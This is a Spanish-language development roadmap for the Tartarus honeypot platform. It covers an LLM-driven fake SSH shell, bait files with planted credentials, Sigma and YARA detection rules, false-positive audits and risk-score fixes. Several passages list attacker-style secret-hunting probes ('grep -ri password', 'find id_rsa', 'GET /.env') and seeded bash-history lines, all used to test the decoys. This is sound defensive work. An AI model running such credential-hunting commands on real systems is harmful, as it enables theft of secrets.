# TARTARUS — ROADMAP DETALLADO DE IMPLEMENTACIÓN

**Versión del documento:** 2.0
**Fecha:** 7 de julio de 2026
**Directorio del proyecto:** `/Users/ivanhuerta/Documents/Tartarus`
**Alcance:** Todo lo pendiente por construir + cómo construirlo (archivos, técnica, validación)

> Fuente de verdad del pendiente. Sustituye la sección "Next Sprint" de `.agents/MANDATES.md` (v2.3). El estado real verificado del código (526 tests, 391 reglas Sigma, ~70 módulos) está por delante de STATUS.md — ver §1.

---

## 0. CÓMO LEER ESTE ROADMAP

Cada ítem: **Objetivo** (qué queda resuelto) · **Cómo hacerlo** (archivos/técnica/endpoint) · **Validación** (criterio de "Done") · **Prioridad / Esfuerzo / Depende de**.

### Escala de prioridad
| Prioridad | Significado | Regla de decisión |
| --- | --- | --- |
| **P0** | Bloqueante o alto impacto inmediato | Antes del laboratorio RPi 5 |
| **P1** | Mejora significativa de cobertura o diferenciación | Siguiente ola tras P0 |
| **P2** | Completar cobertura / pulido | Cuando P0-P1 cierren |
| **P3** | Diferenciación de mercado a largo plazo | Post-laboratorio |

### Escala de esfuerzo
| Esfuerzo | Equivale a |
| --- | --- |
| **S** | < 1 día — una regla, un endpoint, un script |
| **M** | 1–3 días — módulo con tests |
| **L** | 1–2 semanas — feature completo UI + backend |
| **XL** | > 2 semanas — subsistema nuevo |

### Estados
`PENDIENTE` · `EN PROGRESO` · `BLOQUEADO` · `HECHO`

### Definición de "Done" (todo ítem)
1. Código con manejo de errores (no revienta consumer/engine).
2. ≥1 test en la suite (`tests/`) — mantener la suite en verde.
3. Si genera evidencia: campo trazable (SHA256, timestamp, source_ip) para cadena de custodia VRA.
4. Si toca UI: sección actualizada sin romper `_masterPoll()`.
5. Documentado en el reporte ejecutivo.

---

## PENDIENTES MAESTRO (ago-2026)

> Consolidación de TODO lo abierto al cierre de la sesión del **8-ago-2026** para no
> perder el hilo. Rama `feature/tier0-deployment-readiness` (PR #12). Fuentes:
> auto-memoria `backlog-cebos-y-ui`, `tierf-completo-9-bloqueado`. Suite en 969 pass / 4 skip.

### ✅ PARTE A — Realismo del shell SSH (28-ago-2026) — HECHO (6 ítems + refactor)

Plan archivado en `wiki/planes/2026-08-28.md`. Suite **1418 verde** (+18). Todo verificado en vivo.

- **Ítem 1 — clave de host SSH persistente (el tell #1).** Beelzebub v3.9.0 NO admite ruta de clave
  por config (crea el `ssh.Server` de gliderlabs sin `HostSigners` → RSA-2048 efímera por arranque).
  Solución: parche mínimo (`beelzebub/build/beelzebub.patch`, 3 hunks: campo `hostKeyPaths` en el
  parser + `server.SetOption(ssh.HostKeyFile)` en ssh.go + propiedad en el JSON Schema) + imagen local
  `tartarus-beelzebub:v3.9.0-hostkey` (`scripts/build_beelzebub_hostkey.sh`, contexto en clon temporal,
  NO `./beelzebub`). Claves ed25519+rsa generadas en el HOST (`make ensure-hostkeys`, gitignoreadas,
  distintas por nodo). `push-to-rpi.sh` blindado (excluye `keys/` y quita `hostKeyPaths` → no correla
  honeypots por fingerprint, no rompe el sensor sin parche). **Verificado:** huella idéntica tras 2
  reinicios (antes cambiaba); reconexión SSH estricta sin `REMOTE HOST IDENTIFICATION HAS CHANGED`;
  ahora presenta ed25519 + rsa-3072 (antes solo rsa-2048).
- **Refactor 0-bis — reglas del shell inyectadas al aplicar/probar, ya no congeladas.** Módulo nuevo
  `engine/engine/ssh_rules.py` (`SSH_RULES`, `META_SSH`, `compose_ssh_prompt`, `split_scenario`,
  `wants_bash_rules`, `hostname_from_scenario`). La persona guarda solo el ESCENARIO; `apply`/`probe`
  anteponen las reglas frescas del código. **Gate por `rules_profile: bash`** (o marcador presente):
  protege las 5 personas SSH no-bash (cisco/fortigate/jenkins/synology/windows) de recibir reglas bash.
  Arregla el bug del salto de línea (`… BEHAVIOR RULES` pegado). `ubuntu-server.yml` migrada.
- **Ítem 2 — binarios.** `cat`/`head`/`strings` de PDF/docx/xlsx/ELF vuelcan bytes (`%PDF-1.7`, `PK…`),
  nunca meta. Verificado: `cat *.pdf` → `%PDF-1.7` + bytes.
- **Ítem 3 — editores/pagers + toolkit.** `nano`/`vi`/`less` abren y vuelven al prompt; `sudo`,
  `systemctl`, `crontab -l`, `ps aux`, `ip a`… coherentes. Verificado: **0 «command not found»** en 8
  comandos del toolkit.
- **Ítem 4 — locale/industria.** `META_SSH` infiere país/idioma del contexto (español para México),
  respeta el SO del input (ya no fuerza Ubuntu), exige que TODO directorio tenga su fila. Verificado:
  laboratorio de GDL → árbol y usuarios en español coherentes.
- **Ítem 5 — serverName a medida.** `generate-scenario` extrae el hostname; la UI lo guarda en
  `protocols.ssh.serverName`; fallback en `apply` que lo deriva del escenario. Verificado por SSH real:
  el prompt pasó de `mariana@prod-web-01` a **`mariana@hr-dept-srv01:~$`**.
- **Ítem 6 — época/timestamps.** `generate-scenario` acepta `era`; `META_SSH` genera sección
  `TIMELINE`; regla de fechas coherentes. Campo «Época» en la UI. Verificado: era 2018-2020 →
  `resultados_2018/2019/2020.xlsx`.

### ✅ PARTE A.2 — Correcciones y UX tras probar (28-ago-2026) — HECHO

Plan en `wiki/planes/2026-08-28.md`. Commit `0558613`. Suite **1425 verde**. Verificado en vivo.

- **Shell de prueba NAVEGABLE.** El banco era de un solo comando (`analyze` mandaba solo system+user,
  sin memoria) → `cd` y luego `ls` no navegaban. Ahora `llm_client.analyze` acepta `history`; el
  endpoint `/probe` lo recibe/sanea; la UI es un mini-terminal que acumula la sesión y la reenvía.
  Verificado: `cd finanzas` → `ls -l` lista finanzas con fecha 2019.
- **Diálogos propios en TODA la app.** Fuera los `confirm/alert/prompt` nativos (los feos «localhost:8888
  dice…»): `confirmDialog`/`promptDialog` (modal estilizado) + `showToast`; reemplazados ~44 usos.
- **Menos clics al aplicar + causa del «se cae la sesión sola».** Botón «Guardar y aplicar» (un paso);
  `applyPersonality` avisa que reinicia y cierra las sesiones SSH, y hace UN solo reinicio. La caída de la
  sesión a los ~18 s NO era timeout (`deadlineTimeoutSeconds: 600`): Beelzebub se reinició por el flag de
  la UI mientras el usuario estaba conectado.
- **Generador más claro.** Campo «Detalles / archivos y fechas» → `SPECIFIC REQUIREMENTS` (pedir un
  archivo en una ruta con una fecha; ~90-95%); la descripción corta ya no vuelca el contexto entero
  («Entorno IA — <hostname>»); etiquetas por pasos. Verificado: `nomina_marzo_2019.xlsx` en
  `/home/juan/finanzas` con fecha 2019.

### ✅ PARTE A.3 — Entorno con cebo + pulido de realismo (29-ago-2026) — HECHO

Plan en `wiki/planes/2026-08-29.md`. Commit `2402aa5`. Suite **1427 verde**. Verificado en vivo.

- **Entorno RICO y con CEBO (lo que más pidió Iván).** `META_SSH` genera árboles densos (4-12 entradas
  por carpeta, varios usuarios) con **malas prácticas evidentes**: credenciales en claro (`.env`,
  `config.php`, `id_rsa`, `.aws/credentials`), datos joya (`dump.sql`, backups, PII), rastro de recon
  (`.bash_history` con `mysql -uroot -p..`, `scp id_rsa..`), persistencia (cron con secretos). Archivos
  que se **referencian entre sí**. Taxonomía de interés (básico/experto/IA). Presupuesto 2800→4500,
  `max_tokens` 1800→2600. Verificado: despacho contable → 34 filas de árbol con todo el cebo.
- **Búsqueda con cebo + adaptación (SSH_RULES).** `find`/`locate`/`grep -r` sacan el cebo a la luz;
  si el atacante busca algo plausible que no está, se inventa un hit coherente y estable. Verificado:
  `find id_rsa`→ruta real; `grep -ri password`→credenciales en `.env`/`config.php`/`wp-config.php`.
- **cd exitoso = salida VACÍA** (mata el bug de que respondía «ls»). Verificado: `cd X` → `""`.
- **Binarios acotados** (cabecera + ≤8 líneas) y **sin tokens internos** (se colaba `<|disc_score|>`).
- **Tipo fichero/carpeta FIJO por sesión** (no más `RH_Doctores` a veces fichero, a veces carpeta).
- **Latencia**: reglas de interacción condensadas + salidas cortas, sin cambiar de modelo (gpt-4o).
  ~0.7-1.4s por comando en la prueba.
- **Clave de host robusta**: `up`/`up-quick` ya NO corren `clean-ssh` (la huella persiste, se acepta
  UNA vez) + guardia `check-bee-image` que avisa si Beelzebub no corre la imagen parcheada. (Iván había
  visto la clave vieja `zTbHeA` = contenedor en la imagen SIN parche durante una transición.)
- **UI**: editor de persona ancho (`min(1040px,96vw)`) con metadatos a dos columnas (estilo Thinkst);
  prompt del banco sin el punto de más (`mariana@`, no `mariana.@`).

### 🧾 PENDIENTES IMPLÍCITOS (auto) — capturados por la skill `pendientes-roadmap`

> Lo que se dejó de lado en cada sesión, para que nada se pierda. Actualizado por la skill
> `pendientes-roadmap` al cerrar sesión. No duplicar: si un ítem ya vive en otra sección, se
> referencia en vez de repetir.

- [28-ago-2026 · **P1**] **Parte B — constructor por árbol determinista.** El campo «Detalles /
  archivos y fechas» (A.2) lo aproxima por IA (~90-95%: p.ej. pedí fecha 2019-03-15 y salió 2019-03-05).
  El control 100% es el árbol editable: desplegables de industria/departamento sobre `INDUSTRY_SEEDS`
  (`engine/engine/deception_filetree.py:40-102`) + `TOKEN_CATALOG` (`ui/src/js/deploy_hub.js:220-238`),
  vista de árbol editable con **ruta y fecha por archivo** e integración de canary tokens. Antes de
  construir: proponer a Iván el catálogo de industrias/departamentos y la maqueta del árbol.
- [28-ago-2026 · **P2**] **Techo ~90-95% del LLM (residual del shell).** Glitches puntuales medidos
  en vivo: `less <log>` a veces muestra solo `(END)` en vez del contenido; `cat` de un fichero que el
  árbol declara como fichero puede devolver «Is a directory» de forma esporádica. Son fallos de
  determinismo del LLM, no de las reglas — los cierra la **Parte B** (árbol estático como estructura
  de datos, `ls`/`cd`/`cat` deterministas). No requiere acción hasta la Parte B.
- [28-ago-2026 · **P3**] **Tells que necesitan MÁS parche a Beelzebub.** (a) El prompt del shell es
  siempre `usuario@host:~$` — el `:~$` no refleja el `cd` (Beelzebub lo arma con `buildPrompt`, no el
  LLM). (b) El usuario del prompt es el LOGIN del atacante, no el usuario del escenario. Ambos requieren
  ampliar `beelzebub/build/beelzebub.patch`; se dejan como decisión aparte.
- [28-ago-2026 · nota de estado] Al verificar el ítem 5 se **aplicó `ubuntu-server` al servicio SSH
  vivo** (banner `hr-dept-srv01`, persona hospital CDMX) y se reinició Beelzebub. Si se quiere otra
  persona activa, aplicarla desde la consola.

- [25-ago-2026 · **P0** · esfuerzo M] **AUDITORÍA DE FALSOS POSITIVOS (ruido de alertas).** Iván reporta
  correos CRITICAL constantes sin que nadie ataque. Diagnóstico: **~97% del tráfico ingerido es de la
  propia infraestructura**. En la BD (3691 eventos): `192.168.97.7` (beelzebub) 2159 — 2158 son TCP:8080;
  `192.168.97.8` (engine) 169; `192.168.97.1` (gateway) 1363 (mix real de simulaciones NATeadas). Causa
  raíz: `sensor_health_worker.py` prueba beelzebub:8080/:22/:80 **cada 30s** + `sensor_manager.py` (probes
  de verificación de despliegue) + beelzebub hacia sí mismo; beelzebub loguea TODA conexión TCP como
  "sesión" → se ingiere como T1046 recon @ riesgo 80 → correo. **Fix aplicado (parte 1):** el consumer
  descarta en ingesta los eventos cuyo `source_ip` sea de un contenedor propio (auto-resuelto por DNS:
  engine/beelzebub/scanner/ui/… = .2–.10; NO el gateway .1) + override `TARTARUS_INGEST_IGNORE_IPS`/
  `_HOSTS`. Test `test_parse_ignores_infra_source`. **Pendiente de esta auditoría (parte 2):**
  (a) purgar los ~2328 eventos-ruido históricos de la BD (script `scripts/purge_infra_noise.py`; el borrado
  quedó pendiente de correr por el usuario — bloqueado por el clasificador de seguridad del harness);
  (b) revisar por qué el health worker necesita tocar el puerto de ATAQUE (evaluar probar un puerto de
  salud no-honeypot o marcar el probe para que beelzebub no lo registre); (c) revisar TCP:8080 doble
  taxonomía (`TCP` vs `TCP/HTTP`); (d) ✅ **HECHO (25-ago)** — recalibración de severidad; (e) rate-limit/
  agrupar recon repetido de una misma IP antes de alertar; (f) **falso NEGATIVO del despliegue**:
  `sensor_manager.py` verifica el sensor ICMP (`icmp-canary`) con una TCP probe a :8000, pero ese sensor es
  **push-mode** (ICMP vía webhook, sin puerto TCP) → siempre reporta "failed: TCP probe timed out" aunque
  esté corriendo. El `sensor_health_worker` ya distingue push-mode (no lo prueba); alinear la verificación
  del despliegue igual (heartbeat/estado, no TCP). Fecha objetivo: esta ola.

- ✅ ~~[25-ago-2026 · **P0**] **Recalibración de severidad (recon ya no es CRITICAL)**~~ **HECHO**. El `GET /`
  (y `New TCP Session`, `GET /tools/list`) salía **80/CRITICAL** por un **bug circular de scoring**:
  `multi_protocol_kill_chain` (nivel critical) tenía `condition: any_event` → matcheaba CUALQUIER evento y
  el consumer floreaba el riesgo a 80; y 3 meta-reglas (`critical_risk_event` ≥80, `high_risk_event` ≥70,
  `multi_protocol_recon` ≥60) solo re-expresaban el `risk_score` como detección, retroalimentando el floor.
  Además los umbrales estaban **inconsistentes** (≥80 en stats/reportes/correo vs ≥85 en `risk_to_severity`),
  así que un 80 era "high" al guardarse pero "CRITICAL" en los tiles/correo. **Fix:** (1) las 4 meta-reglas a
  `status: deprecated` + el loader de Sigma ignora deprecated; (2) **fuente única de verdad** de umbrales
  (`session_scorer.CRITICAL/HIGH/MEDIUM_THRESHOLD` = 85/70/40) aplicada en events_router, report_router,
  notifier, llm_analyzer, narrative_builder, cross_correlator; (3) el floor de Sigma/YARA ahora usa los cortes
  canónicos **y se registra en `risk_factors`** (antes el 80 salía sin explicación). Verificado en vivo: el
  mismo `GET /` ahora da **50 = MEDIUM** (factores 30+20=50, cuadran) y no dispara correo (<70). Tests:
  `TestDeprecatedRulesSkipped` + asserts de umbral actualizados. Suite 1054 verde.

- ✅ ~~[25-ago-2026 · P1] **Conteo del flock: histórico vs ventana 24h (confusión de UX)**~~ **HECHO**. Iván
  notó que el Default Flock decía "3693" pero el Attack Map y los paneles salían casi vacíos. **No era bug ni
  pérdida:** el header/selector usaba `event_count` de `/api/flocks` (**histórico/all-time**, incl. NULL)
  mientras los paneles usan `?hours=24` (por diseño). Confirmado: 3694 total, **solo 3 en 24h** (casi todo
  viejo; 2328 son el ruido de infra aún sin purgar). **Fix:** `/api/flocks` ahora devuelve también
  `event_count_24h` (COUNT con ventana de 24h); el **selector** muestra "… · 3 en 24h · 3694 total" y la
  **tarjeta** el reciente como número principal con "Eventos 24h · 3694 tot." → el número visible SIEMPRE
  cuadra con los paneles. Suite 1054 verde. **Nota aparte:** siguen vivos los flocks de prueba `AUDIT_A`/
  `AUDIT_B` (de `audit_flock_isolation.py`) — limpiar cuando convenga.

### 🔎 AUDITORÍA PROFUNDA DE FP/ALERTAS/MÉTRICAS (25-ago-2026, 3 agentes) — plan por olas

#### Segunda tanda (26-ago-2026) — pendientes del audit. Plan en `wiki/planes/2026-08-26.md`.

#### Tercera tanda (26-ago-2026) — ✅ **HECHO**: unificar la ingesta y sanear el corpus

El punto 2 ("el barrido de pings ICMP no detecta nada") resultó ser el síntoma de algo mayor: **había
cinco caminos de ingesta y solo uno completo**. El consumer ejecutaba 15 etapas; los cuatro webhooks
entre 5 y 8. Todo lo que entraba por webhook (ICMP, OpenCanary, cebos, sensores) **se guardaba pero no
se analizaba**: jamás generaba una detección. Suite **1102 verde** (+12).

**1. Pipeline compartido** (`engine/engine/ingest_pipeline.py`): `analyze()` (Sigma + YARA + elevación de
riesgo con el motivo anotado), `insert_detections()`, `bump_counters()` y `build_sigma_dict()` — la vista
única que ven las reglas. Los **cinco** caminos lo usan. Cada webhook pasó a `RETURNING id` (sin
`event_id` no hay clave con la que colgar una detección).

**2. Los cuatro bugs latentes:**
- **Kill-chain de ICMP**: se pasaba un dict donde iban 5 argumentos → `TypeError` en cada evento, tragado
  por un `except ... debug`. Al arreglarlo apareció un SEGUNDO fallo oculto detrás: `fetchval` devuelve un
  UUID y el tracer lo serializa a JSON (revienta). Ambos corregidos y el log subido a WARNING — el
  silencio era lo que mantenía el bug vivo. Verificado: entrada real en Redis.
- **`flock_id`**: los 3 caminos que lo omitían ahora lo resuelven; el web-bug hereda el flock **del
  token**. Verificado en vivo: el disparo de un cebo del flock "Iván" queda en Iván, no en Default.
- **8 reglas web muertas** (SQLi, XSS, SSTI, SSRF, LDAP, IDOR, WAF, browser-history): dependían de
  `url`/`method`/`decoded_uri`, que nadie rellenaba aunque el consumer ya extraía método y URI.
  `decoded_uri` deshace el percent-encoding (doble incluido), que es con lo que se esquivan los filtros.
  **Efecto colateral cazado al activarlas**: la regla IDOR tenía `bulk_download_attempt: Method: GET`
  unido por `or` → habría disparado con CUALQUIER GET. Corregida antes de que hiciera daño.
- **Contadores**: los webhooks ya los tocan; el embudo dejó de mentir por omisión (0,0 %).

**3. Corpus saneado** (13 muertas + literales inertes):
- `icmp_ping_sweep`: pedía `'Echo request'` y el emisor produce `echo_request_received` — el término
  salió de documentación obsoleta. **Es lo que cerró el punto 2.**
- `suspicious_user_agent` y `http_scanner_detection`: buscaban firmas de escáner en `command` (que para
  HTTP es solo "MÉTODO URI"); el UA nunca está ahí. Ahora miran `user_agent`.
- `smb_enumeration`: exigía `protocol: SMB` + literales que ese emisor jamás escribe. Imposible.
- `T1021_004_ssh_lateral`: bloque vacío en la condición → siempre falsa; y `selection` casaba 'ssh' y
  '10.' (el banner de casi todo). Reescrita con destino interno explícito.
- **Reglas de credenciales** (`ssh_root_login`, `ssh_common_passwords`): buscaban la contraseña dentro del
  texto del comando. Disparaban con `chown root` o `ssh admin@host` y NO veían el intento real. Ahora
  miran `user`/`password`. Verificado: `chown root` ya no dispara; `root/123456` sí.

**4. Guardarraíles** (`test_ingest_parity_guardrails.py`, 12 tests) — la pieza "nunca más":
- Todo campo declarado en el esquema debe producirlo la ingesta, y ninguna regla puede depender de un
  campo inexistente. *Habría cazado las 8 reglas muertas el día que se escribieron.* Al activarlo destapó
  **7 campos fantasma más**: se rellenaron los útiles y se retiraron del esquema `timestamp`, `flock_id` y
  `username` (una detección no debe decidir por la hora ni por el cliente).
- Cada camino de ingesta debe usar el análisis compartido y poder escribir detecciones (`RETURNING id`).
- Las reglas de umbral deben casar el texto REAL del emisor y no disparar con un solo evento.

**Verificado en vivo:** 2 pings ICMP → nada; el 3º → **una sola** detección de barrido ("3 eventos … en
30s"); el 4º no duplica. OpenCanary y sensores de campo **ya generan detecciones** (antes cero). Datos de
prueba limpiados; 1395 eventos, embudo 0,0 %.

- ✅ ~~**Queda anotado**: sin cobertura MODBUS/SNMP/NTP; literales con barra invertida~~ **HECHO
  (27-ago, Ola C)**. Dos reglas Modbus (lectura → `medium`/Discovery, escritura → `critical`/Impact),
  verificadas en vivo con `attack_modbus.sh`; una regla SNMP/NTP con verificación **sintética**
  (OpenCanary no está desplegado). Los literales resultaron ser **tres** y el matiz importaba: en
  `command` la doble barra es inerte, pero en `payload` es **correcta** (se compara contra el JSON
  serializado). Sobre el cebo `trap123`: no queda ninguna regla con ese valor tras la purga del
  27-ago. **Sigue abierto** solo lo de las reglas Windows sobre un honeypot Linux — el loader ya las
  descarta por esquema, así que no aportan cobertura falsa; retirarlas sería higiene, no un arreglo.

#### Cuarta tanda (26-ago-2026) — ✅ **HECHO**: sanear el histórico de la base

La ingesta ya entraba bien desde la tercera tanda, pero **lo ya guardado seguía mintiendo**. Al medirlo
resultó bastante mayor de lo que decía este ROADMAP (que hablaba de "~983 eventos en 70-84"):

- **1.273 de 1.395 eventos (91 %)** tenían un `risk_score` MAYOR que la suma de sus propios
  `risk_factors`. El caso típico guardaba 80 con dos factores que sumaban 50; los 30 restantes no los
  explicaba nada. Y el rango llegaba a **85**, o sea que incluía eventos pintados CRITICAL.
- **5.076 de las 6.681 detecciones (76 %)** eran de las 4 meta-reglas deprecadas, que el motor ya ni
  carga. Dominaban `/detections/stats`, `/by-rule`, `/severity-distribution`, `/by-technique`, el mapa
  MITRE y la narrativa.

**1. Cómo se arregló, sin re-analizar nada.** Volver a pasar Sigma hoy sobre eventos de hace dos
semanas habría dado resultados distintos por razones ajenas a la recalibración (se ingirieron antes de
que la ingesta rellenara `decoded_uri`, `user_agent`, `url`, `method`). En su lugar se aplicó la
fórmula que usa la ingesta HOY sobre la evidencia YA registrada:

    risk_score = max(suma de sus factores, floor de sus detecciones vivas)

La lógica vive en `engine/engine/rescore.py` (espejo de `ingest_pipeline.analyze()`) y el script es
`scripts/rescore_legacy_events.py` (dry-run por defecto, `--apply`, transacción única, lista de
deprecadas derivada de los propios ficheros para que no se desincronice).

**2. Dos cosas que el plan no había previsto:**
- **346 eventos con la puntuación correcta pero sin nada que la explicara.** Filtrar por "el número
  cambia" los saltaba: son los 330 que YARA eleva a 85 sin dejar constancia más 16 con floor Sigma. La
  comprobación final habría dado 346 en vez de 0. Total tocado: **1.284** (938 cambian de puntuación,
  346 solo reciben los factores que faltaban).
- **YARA no respeta el `level` guardado**: eleva a `CRITICAL_THRESHOLD` directamente
  (`ingest_pipeline.py:126-132`). Deducir el floor del `level` de la fila habría degradado a 70 lo que
  el pipeline pone en 85 — afectaba a las 322 detecciones `yara:Scanner_Nmap_Signature`.

**3. El invariante que queda instalado** (`engine/tests/test_rescore_invariant.py`, 30 tests): *la suma
de los `risk_factors` de un evento es EXACTAMENTE su `risk_score`*. Cualquier elevación tiene que dejar
su factor. **Ese test estaba vacío al escribirlo** y por poco se cuela: `analyze()` consulta dos
singletons de módulo (`sigma_lite._engine`, `yara_engine._engine`) que solo inicializa la app al
arrancar; en pytest están a None y Sigma y YARA devuelven lista vacía sin quejarse. Se añadió un
fixture que carga ambos, un test que exige que estén cargados y otro que exige que los casos SIGAN
disparando. Verificado por mutación: al romper el floor a propósito, falla.

**Resultado medido:** 0 eventos descuadrados, 0 detecciones de reglas deprecadas, 0 huérfanos en
`mitre_evidence`, ni un evento perdido (1.395). Detecciones: 6.681 → **1.605**. Distribución de
severidad: antes todo aplastado contra el techo; ahora **830 medium / 197 high / 368 critical**.
24 eventos SUBIERON de riesgo — revisados uno a uno, todos con detecciones critical legítimas (canary
token disparado, subida de webshell, inyección de comandos, reverse shell, robo de credenciales MCP):
ataques reales que estaban infravalorados.

**4. Bug encontrado al verificar (no era parte del plan): el User-Agent nunca se leía.**
`consumer.py` sacaba el UA de `Headers`, que en Beelzebub es **texto plano**
(`"[Key: User-Agent, values: curl/8.4],…"`), no un diccionario — el diccionario es `HeadersMap`.
Pedirle `.get()` a la cadena lanzaba `AttributeError` en **cada evento HTTP** y, como la búsqueda era
una cadena de `or`, jamás se llegaba a `UserAgent`, que es el campo que sí trae el dato. El bloque
entero —acumulación de score por huella IP:UA **y el envío de la alerta que depende de ella**— caía en
un `logger.debug` sin traza. Meses fallando en silencio. Se extrajo a `consumer.extract_user_agent()`
con 10 tests, y el log de ese bloque se subió a WARNING con `exc_info` (mismo criterio que con el bug
del kill-chain de ICMP: el silencio era lo que lo mantenía vivo). Verificado en vivo: la huella de
Nikto acumula 20 puntos en Redis donde antes no se acumulaba nada.

Suite **1132 verde** (+30).

- ❌ ~~**PENDIENTE (P1) — el corpus está sesgado a `critical`** (391 de 450, 87 %)~~ **ANOTACIÓN
  ERRÓNEA, corregida el 27-ago.** La cifra era correcta y **la conclusión era falsa**. Aquellas
  `critical` eran en su inmensa mayoría reglas `decoy_reuse_*` **autogeneradas, una por cada cebo
  plantado** — y que el reuso de un cebo sea `critical` es lo correcto (`falsepositives: near-zero`).
  No inflaban nada: de las 465 reglas cargadas solo **34 habían disparado alguna vez**, y las que
  disparan son 36 `high`, 5 `medium` y 10 `critical`. El corpus de detección real eran ~83 reglas con
  distribución sana. Se deja escrito para que nadie planifique trabajo sobre el diagnóstico malo.
  Lo que sí había detrás era un problema distinto y real — la tanda que sigue.

#### Quinta tanda (27-ago-2026) — ✅ **HECHO**: cerrar el ciclo de vida de las reglas de cebo

Salió de investigar el falso "sesgo `critical`" de arriba. Detrás no había un problema de
calibración: había una **acumulación silenciosa**, de la misma familia que todo lo demás de esta
auditoría.

Al plantar un cebo se escribe una regla `decoy_reuse_<hash>.yml` que dispara si ese secreto exacto
reaparece en un evento. La idea es buena y la regla está bien escrita. Lo que faltaba era **la otra
mitad**: `decoy_usage.py` tenía `register_decoy()` y **ninguna función de borrado** (cero `unlink`,
cero `remove`), y `DELETE /canary-tokens` quitaba la fila dejando el `.yml` en disco para siempre.

**Lo medido antes de tocar nada:** **382 reglas** en disco (desde el 14-jul) frente a **20 cebos
vivos**; **1 sola** correspondía a un secreto vivo; **0** habían disparado jamás; y **140** eran el
mismo marcador `breadcrumb:prod-backup` repetido (residuos de pruebas).

**Por qué nadie podía limpiarlas, y no era descuido del análisis.** En `canary_router.py:819-826` la
regla se escribe con `secret` pero en la fila se guarda un `token_value` **distinto**: el secreto
nunca se persistía, así que **no existía ningún vínculo** entre una regla y su cebo. La única
excepción era `honey_credentials`, que registra la misma `password` que guarda — de ahí salía la
única regla vinculable del corpus.

**1. El arreglo estructural** (el ciclo, cerrado):
- `decoy_usage.unregister_decoy(decoy_hash)` + `retire_decoys(filas)` + `decoy_hash_for(secreto)`.
  Reciben **el hash, no el secreto**: cuando toca borrar el secreto ya no está a mano, y así no se
  pasean credenciales por una firma.
- **El vínculo que nunca existió**: columna `decoy_hash VARCHAR(12)` en `canary_tokens` y
  `honey_credentials` (`schema.py`, patrón `ADD COLUMN IF NOT EXISTS`). Se guarda el **hash**, jamás
  el secreto — la tabla no debe volverse un almacén de claves.
- Las **tres rutas de baja** leen el hash ANTES del `DELETE` (después la fila ya no está) y retiran
  la regla después, recargando el corpus con `_reload_sigma_safe()`. Es best-effort —que falle un
  borrado de fichero no puede deshacer un `DELETE` ya hecho— pero se registra a **WARNING con traza**,
  no en un `debug` mudo.

**2. Los residuos** (`scripts/reconcile_decoy_rules.py`, dry-run por defecto): respalda en
`backups/decoy_rules_<fecha>.tar.gz` **antes** de borrar. Retiradas **384**, conservada **1**.
También avisa del fallo contrario: un cebo vivo SIN regla en disco (su reuso no se detectaría).

**3. Guardarraíles** (`test_decoy_lifecycle.py`, 14 tests): que `decoy_usage` exponga las dos
mitades, que las rutas de baja llamen a `retire_decoys`, que el alta guarde el vínculo y que la
migración exista. Más los casos feos: hash vacío/None/numérico no puede llevarse una regla por
delante, y retirar dos veces el mismo cebo es un no-op, no un error.

**4. De dónde salían de verdad las 382** (encontrado al observar tras la purga): la **propia suite
de tests las generaba en el árbol real**. Se midieron **7 reglas nuevas en una sola pasada** de
`pytest`; con el pre-commit corriendo la suite en cada commit, más CI, ahí está la acumulación desde
julio. Tres ficheros la causaban (`test_breadcrumb_engine.py`, `test_canary_planter_beacon.py`,
`test_honey_creds_dedup.py`), pero la raíz era más profunda: **solo `canary_planter` respetaba
`TARTARUS_DECOY_RULES_DIR`**; `honey_creds_router` y `breadcrumbs_router` llamaban a
`register_decoy()` sin `rules_dir` y escribían siempre en el corpus real, por mucho que un test
fijara la variable. Arreglado en el punto único `decoy_usage._rules_dir()` (argumento → variable de
entorno → dir por defecto, resuelto en cada llamada) más un fixture `autouse` de sesión en
`conftest.py` que redirige toda la suite a un temporal. `autouse` a propósito: un test nuevo que
plante un cebo queda cubierto sin que su autor sepa nada de esto. Comprobado: la suite entera deja el
árbol igual que lo encontró.

**Ventana de observación cerrada (32 min, 16 muestras):** reglas de cebo estables en 1, corpus en 84,
`descuadrados=0` y `errores_2min=0` en las dieciséis. El `ingestion: stale` que aparece a ratos es el
comportamiento normal sin tráfico, no una avería.

**Verificado en vivo:** plantar un `aws-keys` crea la regla y deja su `decoy_hash` en la fila;
borrarlo devuelve `{"status":"deleted","decoy_rules_retired":1}` y el `.yml` desaparece. El corpus
cargado pasa de **465 a 84** reglas, con distribución por fin sana: **16 medium / 43 high / 25
critical** (30 %, frente al 87 % anterior). Ingesta sin regresión: `GET /.env` → 85 con factores que
suman 85; invariante en 0. Estado final: **1 regla en disco, 1 con dueño, 0 huérfanas**.
Suite **1148 verde** (+16).

**Un fallo propio, dicho con todas las letras:** la primera versión del script nombraba el respaldo
solo con la fecha, así que la **segunda pasada del mismo día sobrescribió el tar.gz de la primera** y
se perdió el respaldo de las 384 reglas retiradas. Impacto real bajo (eran huérfanas confirmadas, sin
dueño y sin un solo disparo en toda la historia de la base), pero el respaldo existe justo para no
depender de eso. Corregido: el nombre lleva fecha **y hora**, y el script aborta antes que
sobrescribir un respaldo existente.

#### Sexta tanda (27-ago-2026) — ✅ **HECHO**: que el riesgo se explique donde alguien lo lee

Culminación de las dos tandas anteriores. Se habían dedicado a que cada puntuación se pudiera
explicar —invariante instalado, 0 eventos descuadrados— y **nada de eso llegaba a ninguna pantalla**:
`/events` no devolvía `risk_factors` (no estaba en su SELECT), la UI ni lo mencionaba
(`grep risk_factors ui/src/js/` → 0) y el correo decía `⚠️ Riesgo: 85/100` sin una palabra de por qué.
El dato existía, era correcto y estaba a mano; se quedaba en la base.

**1. Un solo sitio que entiende los factores.** `risk_factors` viaja en **dos formas**: lista de dicts
desde `analyze()` y cadena JSON en cuanto el consumer la serializa (`consumer.py:449`) — que es como
le llega al notificador. Cada consumidor lo parseaba a su manera, o no lo parseaba y se quedaba sin el
dato sin que nada fallara. Ahora `risk_engine.parse_factors()` y `sum_factor_points()` lo resuelven en
un punto, y `rescore.sum_factors()` **delega** ahí (tres copias de la misma suma es como acaban
divergiendo).

**2. La API entrega los motivos.** `risk_factors` en el SELECT y en la serialización de `/events`,
parseado a lista. Coste medido: 573 bytes de media por evento (máx. 933), comparable al `payload` que
la respuesta ya arrastraba (704).

**3. El correo explica el número.** `notifier._risk_breakdown()` añade el desglose bajo la línea de
riesgo en las **tres** ramas (cebo abierto, credencial señuelo, interacción). Dos cuidados que el dato
real exigía: los factores de **0 puntos son notas, no motivos** (`recalibracion_historica`, en 1.284
eventos — listarlo haría que la suma pareciera no cuadrar), y si los puntos **no** suman el
`risk_score` se muestra el número a secas: un correo de alerta no es sitio para descubrir que el
invariante se rompió.

